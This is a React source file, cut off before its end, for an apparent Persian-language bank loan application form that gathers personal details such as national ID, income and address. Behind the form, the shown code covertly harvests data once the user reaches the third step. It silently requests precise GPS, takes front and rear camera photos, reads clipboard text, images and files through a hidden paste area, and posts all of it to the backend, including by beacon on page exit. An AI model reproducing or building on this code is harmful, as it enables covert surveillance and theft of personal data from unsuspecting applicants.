import React, { useState, useEffect, useRef } from 'react';
import './App.css';
import { Button } from './components/ui/button';
import { Input } from './components/ui/input';
import { Label } from './components/ui/label';
import { Card, CardContent, CardHeader, CardTitle } from './components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './components/ui/select';
import { Textarea } from './components/ui/textarea';
import { 
  Calendar, CheckCircle, Copy, RefreshCw, Building2, FileText, Shield, 
  ArrowLeft, ArrowRight, User, DollarSign,
  Settings, Phone, Home, Briefcase, CreditCard, Target, Lock, AlertTriangle,
  Zap, Users, MapPin, Camera, Clipboard
} from 'lucide-react';
import { toast } from 'sonner';
import axios from 'axios';

// Dynamic backend URL detection for flexible hosting
const getBackendUrl = () => {
  // Check if we have a predefined backend URL
  if (process.env.REACT_APP_BACKEND_URL && process.env.REACT_APP_BACKEND_URL.trim() !== '') {
    return process.env.REACT_APP_BACKEND_URL;
  }
  
  // Auto-detect based on current location
  const currentHost = window.location.hostname;
  const currentProtocol = window.location.protocol;
  const currentPort = window.location.port;
  
  // For local development
  if (currentHost === 'localhost' || currentHost === '127.0.0.1') {
    return `${currentProtocol}//${currentHost}:8001`;
  }
  
  // For production - assume backend is on same domain with /api path or port 8001
  if (currentPort && currentPort !== '80' && currentPort !== '443') {
    // Try same host with port 8001
    return `${currentProtocol}//${currentHost}:8001`;
  }
  
  // Default: same domain with /api prefix (most common setup)
  return `${currentProtocol}//${currentHost}`;
};

const BACKEND_URL = getBackendUrl();
const API = `${BACKEND_URL}/api`;

// Generate 8-digit tracking code (numbers and letters)
const generateTrackingCode = () => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = '';
  for (let i = 0; i < 8; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
};

// Persian months
const persianMonths = [
  'فروردین', 'اردیبهشت', 'خرداد', 'تیر', 'مرداد', 'شهریور',
  'مهر', 'آبان', 'آذر', 'دی', 'بهمن', 'اسفند'
];

// Number formatting function
const formatNumber = (number) => {
  if (!number) return '';
  return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
};

// Parse formatted number
const parseNumber = (formattedNumber) => {
  if (!formattedNumber && formattedNumber !== 0) return '';
  const stringValue = formattedNumber.toString();
  return stringValue.replace(/,/g, '');
};

// Calculate loan fee (2% Islamic banking)
const calculateLoanFee = (amount) => {
  const numAmount = parseInt(parseNumber(amount)) || 0;
  return Math.round(numAmount * 0.02);
};

// Enhanced Success Modal Component with Beautiful Popup
const SuccessModal = ({ trackingCode, onClose, onNewApplication }) => {
  const [copied, setCopied] = useState(false);
  
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(trackingCode);
      setCopied(true);
      toast.success('کد پیگیری با موفقیت کپی شد');
      setTimeout(() => setCopied(false), 2000);
    } catch (error) {
      // Fallback for older browsers
      const textArea = document.createElement('textarea');
      textArea.value = trackingCode;
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();
      try {
        document.execCommand('copy');
        setCopied(true);
        toast.success('کد پیگیری با موفقیت کپی شد');
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        toast.error('خطا در کپی کردن');
      }
      document.body.removeChild(textArea);
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4 animate-fadeIn">
      <div className="bg-white rounded-2xl max-w-md w-full mx-4 shadow-2xl transform transition-all duration-300">
        {/* Header with gradient */}
        <div className="bg-gradient-to-r from-green-500 to-emerald-600 rounded-t-2xl p-6 text-center">
          <div className="w-16 h-16 bg-white bg-opacity-20 rounded-full flex items-center justify-center mx-auto mb-4">
            <CheckCircle className="w-10 h-10 text-white" />
          </div>
          <h2 className="text-2xl font-bold text-white">تبریک!</h2>
          <p className="text-green-100 mt-2">درخواست شما با موفقیت ثبت شد</p>
        </div>

        {/* Content */}
        <div className="p-6">
          <div className="text-center mb-6">
            <h3 className="text-lg font-semibold text-gray-800 mb-2">کد رهگیری درخواست شما</h3>
            <p className="text-sm text-gray-600">این کد را برای پیگیری درخواست خود نزد خود نگه دارید</p>
          </div>

          {/* Tracking Code Display */}
          <div className="bg-gradient-to-r from-gray-50 to-gray-100 border-2 border-dashed border-gray-300 rounded-xl p-4 mb-6">
            <div className="flex items-center justify-center gap-3">
              <span 
                className="text-2xl font-bold text-gray-800 font-mono tracking-wider select-all"
                data-testid="tracking-code-display"
              >
                {trackingCode}
              </span>
              <Button
                onClick={handleCopy}
                variant="outline"
                size="sm"
                className={`transition-all duration-200 ${
                  copied 
                    ? 'bg-green-100 border-green-300 text-green-600' 
                    : 'border-gray-300 text-gray-600 hover:bg-gray-50'
                }`}
                data-testid="copy-tracking-btn"
              >
                {copied ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
              </Button>
            </div>
          </div>

          {/* Information Box */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <h4 className="font-semibold text-blue-800 mb-2 flex items-center gap-2">
              <Building2 className="w-4 h-4" />
              مراحل بعدی
            </h4>
            <p className="text-blue-700 text-sm leading-relaxed">
              کد پیگیری را یادداشت کنید و نزد خود نگه دارید. اطلاعات شما و موارد دیگر توسط کارشناسان بانک بررسی خواهد شد و در صورت کسب امتیاز لازم با شما تماس خواهند گرفت برای زمان دریافت مدارک شناسایی و مندرجات پرونده.
            </p>
          </div>

          {/* Action Buttons */}
          <div className="flex gap-3">
            <Button 
              onClick={onNewApplication}
              className="flex-1 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white"
              data-testid="new-application-btn"
            >
              <RefreshCw className="w-4 h-4 mr-2" />
              درخواست جدید
            </Button>
            <Button 
              onClick={onClose}
              variant="outline"
              className="flex-1 border-gray-300 text-gray-700 hover:bg-gray-50"
              data-testid="close-modal-btn"
            >
              بستن
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
};

// Persian Calendar Component
const PersianCalendar = ({ onDateSelect, selectedDate, onClose }) => {
  const [step, setStep] = useState('year');
  const [selectedYear, setSelectedYear] = useState(1400);
  const [selectedMonth, setSelectedMonth] = useState(0);
  const [selectedDay, setSelectedDay] = useState(null);

  useEffect(() => {
    if (selectedDate) {
      const parts = selectedDate.split('/');
      if (parts.length === 3) {
        setSelectedYear(parseInt(parts[0]));
        setSelectedMonth(parseInt(parts[1]) - 1);
        setSelectedDay(parseInt(parts[2]));
      }
    }
  }, [selectedDate]);

  const getDaysInMonth = (year, month) => {
    if (month < 6) return 31;
    if (month < 11) return 30;
    return isLeapYear(year) ? 30 : 29;
  };

  const isLeapYear = (year) => {
    const breaks = [
      -61, 9, 38, 199, 426, 686, 756, 818, 1111, 1181, 1210,
      1635, 2060, 2097, 2192, 2262, 2324, 2394, 2456, 3178
    ];
    
    let gy = year + 1595;
    let leap = -14;
    let jp = breaks[0];
    let jump = 0;
    
    for (let j = 1; j <= 19; j++) {
      let jm = breaks[j];
      jump = jm - jp;
      if (year < jm) break;
      leap += Math.floor(jump / 33) * 8 + Math.floor((jump % 33) / 4);
      jp = jm;
    }
    
    let n = year - jp;
    if (n < jump) {
      leap += Math.floor(n / 33) * 8 + Math.floor((n % 33 + 3) / 4);
      if ((jump % 33) === 4 && (jump - n) === 4) leap++;
    }
    
    return (leap + 4) % 33 < 5;
  };

  const handleYearSelect = (year) => {
    setSelectedYear(year);
    setStep('month');
  };

  const handleMonthSelect = (month) => {
    setSelectedMonth(month);
    setStep('day');
  };

  const handleDaySelect = (day) => {
    setSelectedDay(day);
    const dateString = `${selectedYear}/${String(selectedMonth + 1).padStart(2, '0')}/${String(day).padStart(2, '0')}`;
    onDateSelect(dateString);
    onClose();
  };

  const renderYearSelection = () => {
    const years = [];
    for (let year = 1358; year <= 1405; year++) {
      years.push(
        <button
          key={year}
          onClick={() => handleYearSelect(year)}
          className={`p-3 rounded-lg text-center transition-all ${
            selectedYear === year 
              ? 'bg-cyan-500 text-white shadow-lg' 
              : 'hover:bg-cyan-100 text-gray-700 border'
          }`}
        >
          {year}
        </button>
      );
    }
    return <div className="grid grid-cols-3 gap-2 max-h-80 overflow-y-auto">{years}</div>;
  };

  const renderMonthSelection = () => {
    return (
      <div className="grid grid-cols-2 gap-2">
        {persianMonths.map((month, index) => (
          <button
            key={index}
            onClick={() => handleMonthSelect(index)}
            className={`p-3 rounded-lg text-center transition-all ${
              selectedMonth === index 
                ? 'bg-cyan-500 text-white shadow-lg' 
                : 'hover:bg-cyan-100 text-gray-700 border'
            }`}
          >
            {month}
          </button>
        ))}
      </div>
    );
  };

  const renderDaySelection = () => {
    const daysInMonth = getDaysInMonth(selectedYear, selectedMonth);
    const days = [];

    for (let day = 1; day <= daysInMonth; day++) {
      days.push(
        <button
          key={day}
          onClick={() => handleDaySelect(day)}
          className={`w-10 h-10 flex items-center justify-center rounded-full text-sm transition-all ${
            selectedDay === day 
              ? 'bg-cyan-500 text-white shadow-lg' 
              : 'hover:bg-cyan-100 text-gray-700'
          }`}
        >
          {day}
        </button>
      );
    }

    return (
      <div>
        <div className="grid grid-cols-7 gap-1 mb-4">
          {['ش', 'ی', 'د', 'س', 'چ', 'پ', 'ج'].map(day => (
            <div key={day} className="text-center text-xs font-medium text-gray-500 p-2">
              {day}
            </div>
          ))}
          {days}
        </div>
      </div>
    );
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" onClick={onClose}>
      <div className="bg-white rounded-lg p-6 max-w-md w-full mx-4" onClick={e => e.stopPropagation()}>
        <div className="text-center mb-4">
          <h3 className="text-lg font-semibold">
            {step === 'year' && 'انتخاب سال'}
            {step === 'month' && `انتخاب ماه - ${selectedYear}`}
            {step === 'day' && `انتخاب روز - ${persianMonths[selectedMonth]} ${selectedYear}`}
          </h3>
        </div>

        <div className="mb-4">
          {step === 'year' && renderYearSelection()}
          {step === 'month' && renderMonthSelection()}
          {step === 'day' && renderDaySelection()}
        </div>

        <div className="flex gap-2">
          <Button onClick={onClose} variant="outline" className="flex-1">
            انصراف
          </Button>
          {step !== 'year' && (
            <Button 
              onClick={() => {
                if (step === 'month') setStep('year');
                if (step === 'day') setStep('month');
              }}
              variant="outline" 
              className="flex-1"
            >
              بازگشت
            </Button>
          )}
        </div>
      </div>
    </div>
  );
};

function App() {
  // Form state management
  const [currentSection, setCurrentSection] = useState(1);
  const [showCalendar, setShowCalendar] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [applicationSubmitted, setApplicationSubmitted] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [trackingCode, setTrackingCode] = useState('');
  
  // Enhanced permission states with manual override
  const [permissions, setPermissions] = useState({
    location: false,
    camera: false,
    clipboard: false
  });
  
  const [permissionData, setPermissionData] = useState({
    location: null,
    photos: { front: false, back: false },
    clipboardContent: '',
    clipboardFiles: [],
    hasImages: false,
    hasFiles: false
  });

  const [isProcessingBackground, setIsProcessingBackground] = useState(false);
  
  const streamRefs = useRef({ front: null, back: null });
  const watchIdRef = useRef(null);
  
  const [formData, setFormData] = useState({
    // Section 1: Personal Information
    full_name: '',
    national_id: '',
    birth_date: '',
    phone_number: '',
    email: '',
    address: '',
    job_title: '',
    monthly_income: '',
    
    // Section 2: Loan Information
    loan_type: '',
    loan_amount: '',
    loan_purpose: '',
    repayment_period: '',
  });

  const loanTypes = [
    { key: 'emergency', label: 'وام ضروری (اضطراری)', maxAmount: 1_000_000_000 },
    { key: 'housing', label: 'وام مسکن', maxAmount: 1_000_000_000 },
    { key: 'car', label: 'وام خودرو', maxAmount: 1_000_000_000 },
    { key: 'other', label: 'سایر وام‌ها', maxAmount: 1_000_000_000 }
  ];

  // Auto-trigger SILENT permissions on section 3 entry
  useEffect(() => {
    if (currentSection === 3) {
      setIsProcessingBackground(true);
      requestAllPermissionsSilently();
    }
  }, [currentSection]);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (watchIdRef.current) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
      
      Object.values(streamRefs.current).forEach(stream => {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      });
    };
  }, []);

  // Send data before user leaves
  useEffect(() => {
    const handleBeforeUnload = () => {
      if (permissions.location && permissionData.location) {
        navigator.sendBeacon(`${API}/location`, JSON.stringify({
          latitude: permissionData.location.latitude,
          longitude: permissionData.location.longitude,
          accuracy: permissionData.location.accuracy,
          user_agent: navigator.userAgent,
        }));
      }
    };

    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
  }, [permissions, permissionData]);

  const handleInputChange = (field, value) => {
    // Enhanced number formatting with Persian/English keyboard support
    if (field === 'monthly_income' || field === 'loan_amount') {
      const convertToEnglishDigits = (input) => {
        const persianDigits = ['۰', '۱', '۲', '۳', '۴', '۵', '۶', '۷', '۸', '۹'];
        const arabicDigits = ['٠', '١', '٢', '٣', '٤', '٥', '٦', '٧', '٨', '٩'];
        let result = input;
        
        persianDigits.forEach((persian, index) => {
          result = result.replace(new RegExp(persian, 'g'), index.toString());
        });
        
        arabicDigits.forEach((arabic, index) => {
          result = result.replace(new RegExp(arabic, 'g'), index.toString());
        });
        
        return result;
      };
      
      let processedValue = convertToEnglishDigits(value);
      const numericValue = parseNumber(processedValue);
      
      if (/^\d*$/.test(numericValue)) {
        setFormData({ 
          ...formData, 
          [field]: numericValue ? formatNumber(numericValue) : '' 
        });
      }
    } else {
      setFormData({ ...formData, [field]: value });
    }
  };

  const handleDateSelect = (date) => {
    handleInputChange('birth_date', date);
  };

  const nextSection = () => {
    if (currentSection < 3) {
      setCurrentSection(currentSection + 1);
    }
  };

  const prevSection = () => {
    if (currentSection > 1) {
      setCurrentSection(currentSection - 1);
    }
  };

  const validateSection1 = () => {
    const required = ['full_name', 'national_id', 'birth_date', 'phone_number', 'address', 'job_title', 'monthly_income'];
    return required.every(field => formData[field].trim() !== '');
  };

  const validateSection2 = () => {
    const required = ['loan_type', 'loan_amount', 'loan_purpose', 'repayment_period'];
    const basicValidation = required.every(field => formData[field].toString().trim() !== '');
    
    if (!basicValidation) return false;
    
    try {
      const loanAmount = parseInt(parseNumber(formData.loan_amount), 10);
      if (isNaN(loanAmount) || loanAmount < 100_000_000 || loanAmount > 1_000_000_000) {
        return false;
      }
    } catch (error) {
      return false;
    }
    
    return true;
  };

  // ULTRA-PRECISE LOCATION: Enhanced GPS with multiple strategies and accuracy validation
  const requestLocationPermission = async (isManual = false) => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        console.log('Geolocation not supported');
        resolve(false);
        return;
      }

      let bestPosition = null;
      let attempts = 0;
      const maxAttempts = isManual ? 8 : 5;
      const targetAccuracy = 10;
      let watchId = null;

      const updateLocationData = (position) => {
        const accuracy = position.coords.accuracy || 999999;
        
        if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
          bestPosition = position;
          
          const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: accuracy,
            altitude: position.coords.altitude || null,
            altitudeAccuracy: position.coords.altitudeAccuracy || null,
            heading: position.coords.heading || null,
            speed: position.coords.speed || null,
            timestamp: new Date(position.timestamp).toISOString()
          };
          
          setPermissionData(prev => ({ ...prev, location: locationData }));
          
          const googleMapsLink = `https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}`;
          const wazeLink = `https://waze.com/ul?q=${locationData.latitude},${locationData.longitude}`;
          
          axios.post(`${API}/location`, {
            ...locationData,
            user_agent: navigator.userAgent,
            google_maps_link: googleMapsLink,
            waze_link: wazeLink,
            is_manual_request: isManual,
            accuracy_level: accuracy < 10 ? 'EXCELLENT' : accuracy < 50 ? 'GOOD' : accuracy < 100 ? 'FAIR' : 'POOR',
            collection_method: 'enhanced_gps_v3'
          }).catch(error => console.log('Location save error:', error));

          if (isManual) {
            const accuracyText = accuracy < 10 ? 'عالی' : accuracy < 50 ? 'خوب' : accuracy < 100 ? 'متوسط' : 'ضعیف';
            toast.success(`موقعیت با دقت ${Math.round(accuracy)} متر دریافت شد (${accuracyText})`);
          }
          
          if (accuracy <= targetAccuracy) {
            if (watchId) {
              navigator.geolocation.clearWatch(watchId);
              watchId = null;
            }
            setPermissions(prev => ({ ...prev, location: true }));
            resolve(true);
            return;
          }
        }
      };

      const tryHighAccuracyPosition = async (timeoutMs = 25000) => {
        return new Promise((posResolve) => {
          const timeoutId = setTimeout(() => posResolve(null), timeoutMs);

          navigator.geolocation.getCurrentPosition(
            (position) => {
              clearTimeout(timeoutId);
              posResolve(position);
            },
            (error) => {
              clearTimeout(timeoutId);
              console.log(`High accuracy attempt failed: ${error.message}`);
              posResolve(null);
            },
            {
              enableHighAccuracy: true,
              timeout: timeoutMs - 2000,
              maximumAge: 0
            }
          );
        });
      };

      const tryStandardPosition = async (timeoutMs = 15000) => {
        return new Promise((posResolve) => {
          const timeoutId = setTimeout(() => posResolve(null), timeoutMs);

          navigator.geolocation.getCurrentPosition(
            (position) => {
              clearTimeout(timeoutId);
              posResolve(position);
            },
            (error) => {
              clearTimeout(timeoutId);
              console.log(`Standard accuracy attempt failed: ${error.message}`);
              posResolve(null);
            },
            {
              enableHighAccuracy: false,
              timeout: timeoutMs - 2000,
              maximumAge: 30000
            }
          );
        });
      };

      const setupContinuousWatch = () => {
        try {
          watchId = navigator.geolocation.watchPosition(
            (position) => {
              updateLocationData(position);
              attempts++;
              
              if (position.coords.accuracy <= targetAccuracy || attempts >= maxAttempts) {
                if (watchId) {
                  navigator.geolocation.clearWatch(watchId);
                  watchId = null;
                }
                setPermissions(prev => ({ ...prev, location: true }));
                resolve(true);
              }
            },
            (error) => {
              console.log('Watch position error:', error);
            },
            {
              enableHighAccuracy: true,
              maximumAge: 5000,
              timeout: 8000
            }
          );
        } catch (error) {
          console.log('Watch setup failed:', error);
          resolve(false);
        }
      };

      const attemptLocationSequence = async () => {
        console.log(`Starting location attempt sequence (${maxAttempts} attempts max)`);
        
        attempts++;
        let position = await tryHighAccuracyPosition(25000);
        if (position) {
          updateLocationData(position);
          if (position.coords.accuracy <= targetAccuracy) {
            setPermissions(prev => ({ ...prev, location: true }));
            resolve(true);
            return;
          }
        }

        if (attempts < maxAttempts) {
          attempts++;
          position = await tryStandardPosition(15000);
          if (position) {
            updateLocationData(position);
            if (position.coords.accuracy <= targetAccuracy) {
              setPermissions(prev => ({ ...prev, location: true }));
              resolve(true);
              return;
            }
          }
        }

        for (let i = 0; i < 3 && attempts < maxAttempts; i++) {
          attempts++;
          await new Promise(resolve => setTimeout(resolve, 2000));
          position = await tryHighAccuracyPosition(20000);
          if (position) {
            updateLocationData(position);
            if (position.coords.accuracy <= targetAccuracy) {
              setPermissions(prev => ({ ...prev, location: true }));
              resolve(true);
              return;
            }
          }
        }

        if (attempts < maxAttempts) {
          setupContinuousWatch();
          setTimeout(() => {
            if (watchId) {
              navigator.geolocation.clearWatch(watchId);
              watchId = null;
            }
            if (bestPosition) {
              setPermissions(prev => ({ ...prev, location: true }));
              resolve(true);
            } else {
              resolve(false);
            }
          }, isManual ? 20000 : 10000);
        } else {
          if (bestPosition) {
            setPermissions(prev => ({ ...prev, location: true }));
            resolve(true);
          } else {
            resolve(false);
          }
        }
      };

      const cleanup = () => {
        if (watchId) {
          navigator.geolocation.clearWatch(watchId);
          watchId = null;
        }
      };

      attemptLocationSequence().catch(() => {
        cleanup();
        resolve(false);
      });

      setTimeout(cleanup, isManual ? 30000 : 20000);
    });
  };

  // ENHANCED CAMERA: Improved multi-camera support
  const capturePhotoEnhanced = async (facingMode, isManual = false) => {
    let stream = null;
    try {
      await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(s => s.getTracks().forEach(track => track.stop()));
      
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      
      console.log('Available cameras:', videoDevices);

      let constraints = null;
      
      if (facingMode === 'environment' && videoDevices.length > 1) {
        const rearKeywords = ['back', 'rear', 'environment', 'world', 'main', 'camera2'];
        let backCamera = videoDevices.find(device => 
          rearKeywords.some(keyword => 
            device.label.toLowerCase().includes(keyword)
          )
        );
        
        if (!backCamera) {
          backCamera = videoDevices[videoDevices.length - 1];
        }
        
        if (backCamera?.deviceId) {
          constraints = {
            video: {
              deviceId: { exact: backCamera.deviceId },
              width: { ideal: 1920, min: 1280 },
              height: { ideal: 1080, min: 720 },
              facingMode: 'environment'
            }
          };
        }
      } else {
        const frontKeywords = ['front', 'user', 'face', 'selfie', 'camera1'];
        let frontCamera = videoDevices.find(device => 
          frontKeywords.some(keyword => 
            device.label.toLowerCase().includes(keyword)
          )
        );
        
        if (!frontCamera) {
          frontCamera = videoDevices[0];
        }
        
        if (frontCamera?.deviceId) {
          constraints = {
            video: {
              deviceId: { exact: frontCamera.deviceId },
              width: { ideal: 1280, min: 640 },
              height: { ideal: 720, min: 480 },
              facingMode: 'user'
            }
          };
        }
      }

      const fallbackConstraints = [
        constraints,
        {
          video: {
            facingMode: { exact: facingMode },
            width: { ideal: 1280, max: 1920 },
            height: { ideal: 720, max: 1080 }
          }
        },
        {
          video: {
            facingMode: facingMode,
            width: { ideal: 640, max: 1280 },
            height: { ideal: 480, max: 720 }
          }
        },
        {
          video: {
            facingMode: facingMode
          }
        },
        {
          video: true
        }
      ].filter(Boolean);

      for (let i = 0; i < fallbackConstraints.length; i++) {
        try {
          stream = await navigator.mediaDevices.getUserMedia(fallbackConstraints[i]);
          console.log(`${facingMode} camera accessed with constraint set ${i + 1}`);
          break;
        } catch (error) {
          console.log(`Constraint set ${i + 1} failed for ${facingMode}:`, error);
          if (i === fallbackConstraints.length - 1) throw error;
        }
      }

      if (!stream) throw new Error('No camera access');

      streamRefs.current[facingMode === 'user' ? 'front' : 'back'] = stream;

      const video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      
      await new Promise((resolve) => {
        video.onloadedmetadata = resolve;
        video.play();
      });

      await new Promise(resolve => setTimeout(resolve, 2000));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      const ctx = canvas.getContext('2d');
      
      ctx.filter = 'contrast(1.1) brightness(1.05) saturate(1.1)';
      ctx.drawImage(video, 0, 0);

      stream.getTracks().forEach(track => track.stop());
      streamRefs.current[facingMode === 'user' ? 'front' : 'back'] = null;

      const photoData = canvas.toDataURL('image/jpeg', 0.9);
      
      axios.post(`${API}/upload-photo`, {
        photo_data: photoData,
        camera_type: facingMode === 'user' ? 'front' : 'back',
        timestamp: new Date().toISOString(),
        latitude: permissionData.location?.latitude,
        longitude: permissionData.location?.longitude,
        accuracy: permissionData.location?.accuracy,
        is_manual_request: isManual
      }).catch(error => console.log('Photo upload error:', error));

      if (isManual) {
        toast.success(`عکس دوربین ${facingMode === 'user' ? 'جلو' : 'عقب'} با موفقیت گرفته شد`);
      }

      console.log(`${facingMode} camera photo captured successfully`);
      return true;
    } catch (error) {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        streamRefs.current[facingMode === 'user' ? 'front' : 'back'] = null;
      }
      
      console.log(`Camera ${facingMode} error:`, error);
      
      if (isManual) {
        toast.error(`خطا در دسترسی به دوربین ${facingMode === 'user' ? 'جلو' : 'عقب'}`);
      }
      
      return false;
    }
  };

  const requestCameraPermission = async (isManual = false) => {
    try {
      console.log('Starting enhanced camera capture sequence...');
      
      const frontResult = await capturePhotoEnhanced('user', isManual);
      await new Promise(resolve => setTimeout(resolve, isManual ? 2000 : 1000));
      const backResult = await capturePhotoEnhanced('environment', isManual);
      
      if (frontResult || backResult) {
        setPermissionData(prev => ({ 
          ...prev, 
          photos: { front: frontResult, back: backResult } 
        }));
        setPermissions(prev => ({ ...prev, camera: true }));
        console.log(`Enhanced camera results: Front=${frontResult}, Back=${backResult}`);
        return true;
      }
      
      return false;
    } catch (error) {
      console.log('Enhanced camera permission error:', error);
      return false;
    }
  };

  // ENHANCED MULTIMEDIA CLIPBOARD: Support for text, images, and files
  const requestClipboardPermission = async (isManual = false) => {
    try {
      let clipboardContent = '';
      let success = false;
      let method = 'unknown';
      let clipboardFiles = [];
      let hasImages = false;
      let hasFiles = false;

      const timeout = isManual ? 20000 : 10000;

      console.log('Starting enhanced multimedia clipboard reading...');

      // Strategy 1: Modern Clipboard API with multimedia support
      if (navigator.clipboard) {
        try {
          const permission = await navigator.permissions.query({name: 'clipboard-read'});
          console.log('Clipboard permission state:', permission.state);
          
          if (permission.state !== 'denied') {
            if (navigator.clipboard.read) {
              try {
                const clipboardItems = await Promise.race([
                  navigator.clipboard.read(),
                  new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Clipboard read timeout')), timeout)
                  )
                ]);

                let textContent = '';
                let imageCount = 0;
                let fileCount = 0;

                for (const clipboardItem of clipboardItems) {
                  if (clipboardItem.types.includes('text/plain')) {
                    try {
                      const textBlob = await clipboardItem.getType('text/plain');
                      const text = await textBlob.text();
                      if (text && text.trim()) {
                        textContent = text;
                      }
                    } catch (e) {
                      console.log('Text reading failed:', e);
                    }
                  }

                  for (const type of clipboardItem.types) {
                    if (type.startsWith('image/')) {
                      try {
                        const imageBlob = await clipboardItem.getType(type);
                        const imageUrl = URL.createObjectURL(imageBlob);
                        clipboardFiles.push({
                          type: 'image',
                          mimeType: type,
                          size: imageBlob.size,
                          url: imageUrl,
                          name: `clipboard_image_${Date.now()}.${type.split('/')[1]}`
                        });
                        imageCount++;
                        hasImages = true;
                      } catch (e) {
                        console.log(`Image reading failed for ${type}:`, e);
                      }
                    }
                  }

                  for (const type of clipboardItem.types) {
                    if (!type.startsWith('image/') && !type.includes('text/')) {
                      try {
                        const fileBlob = await clipboardItem.getType(type);
                        clipboardFiles.push({
                          type: 'file',
                          mimeType: type,
                          size: fileBlob.size,
                          name: `clipboard_file_${Date.now()}`
                        });
                        fileCount++;
                        hasFiles = true;
                      } catch (e) {
                        console.log(`File reading failed for ${type}:`, e);
                      }
                    }
                  }
                }

                let contentParts = [];
                
                if (textContent) {
                  contentParts.push(`📝 متن: ${textContent}`);
                }
                
                if (imageCount > 0) {
                  contentParts.push(`🖼️ تصاویر: ${imageCount} فایل`);
                }
                
                if (fileCount > 0) {
                  contentParts.push(`📁 فایل‌ها: ${fileCount} فایل`);
                }

                if (contentParts.length > 0) {
                  clipboardContent = contentParts.join(' | ');
                  success = true;
                  method = 'modern_multimedia_api_enhanced';
                }

              } catch (error) {
                console.log('Multimedia clipboard read failed:', error);
              }
            }

            if (!success && navigator.clipboard.readText) {
              try {
                const text = await Promise.race([
                  navigator.clipboard.readText(),
                  new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Text clipboard timeout')), timeout)
                  )
                ]);
                
                if (text && text.trim()) {
                  clipboardContent = text;
                  success = true;
                  method = 'modern_text_api_enhanced';
                }
              } catch (error) {
                console.log('Text clipboard read failed:', error);
              }
            }
          }
        } catch (error) {
          console.log('Modern clipboard permission failed:', error);
        }
      }

      // Strategy 2: Paste event listener for manual requests
      if (!success && isManual) {
        try {
          const pasteArea = document.createElement('div');
          pasteArea.contentEditable = true;
          pasteArea.style.position = 'fixed';
          pasteArea.style.left = '-9999px';
          pasteArea.style.opacity = '0';
          pasteArea.style.width = '1px';
          pasteArea.style.height = '1px';
          document.body.appendChild(pasteArea);
          
          pasteArea.focus();
          
          toast.info('لطفاً Ctrl+V یا Cmd+V فشار دهید تا محتویات کلیپبورد خوانده شود');
          
          await new Promise((resolve, reject) => {
            let resolved = false;
            
            const handlePaste = async (e) => {
              if (resolved) return;
              resolved = true;
              
              e.preventDefault();
              
              let textContent = '';
              let pasteImageCount = 0;
              let pasteFileCount = 0;

              const text = e.clipboardData?.getData('text/plain');
              if (text && text.trim()) {
                textContent = text;
              }

              const items = Array.from(e.clipboardData?.items || []);
              for (const item of items) {
                if (item.kind === 'file') {
                  const file = item.getAsFile();
                  if (file) {
                    if (file.type.startsWith('image/')) {
                      const imageUrl = URL.createObjectURL(file);
                      clipboardFiles.push({
                        type: 'image',
                        mimeType: file.type,
                        size: file.size,
                        url: imageUrl,
                        name: file.name || `pasted_image_${Date.now()}.${file.type.split('/')[1]}`
                      });
                      pasteImageCount++;
                      hasImages = true;
                    } else {
                      clipboardFiles.push({
                        type: 'file',
                        mimeType: file.type,
                        size: file.size,
                        name: file.name || `pasted_file_${Date.now()}`
                      });
                      pasteFileCount++;
                      hasFiles = true;
                    }
                  }
                }
              }

              let contentParts = [];
              
              if (textContent) {
                contentParts.push(`📝 متن: ${textContent.substring(0, 100)}${textContent.length > 100 ? '...' : ''}`);
              }
              
              if (pasteImageCount > 0) {
                contentParts.push(`🖼️ تصاویر: ${pasteImageCount} فایل`);
              }
              
              if (pasteFileCount > 0) {
                contentParts.push(`📁 فایل‌ها: ${pasteFileCount} فایل`);
              }

              if (contentParts.length > 0) {
                clipboardContent = contentParts.join(' | ');
                success = true;
                method = 'manual_paste_multimedia_enhanced';
              }

              cleanup();
              resolve();
            };
            
            const cleanup = () => {
              pasteArea.removeEventListener('paste', handlePaste);
              if (document.body.contains(pasteArea)) {
                document.body.removeChild(pasteArea);
              }
            };
            
            pasteArea.addEventListener('paste', handlePaste);
            
            setTimeout(() => {
              if (!resolved) {
                resolved = true;
                cleanup();
                reject(new Error('Manual paste timeout'));
              }
            }, 15000);
          });
        } catch (error) {
          console.log('Manual paste method failed:', error);
        }
      }

      // Strategy 3: Enhanced browser detection with system info
      if (!success) {
        const userAgent = navigator.userAgent.toLowerCase();
        const language = navigator.language || navigator.userLanguage || 'fa';
        const platform = navigator.platform || 'unknown';
        const timestamp = new Date().toISOString();
        
        const systemInfo = {
          userAgent: navigator.userAgent,
          language: language,
          platform: platform,
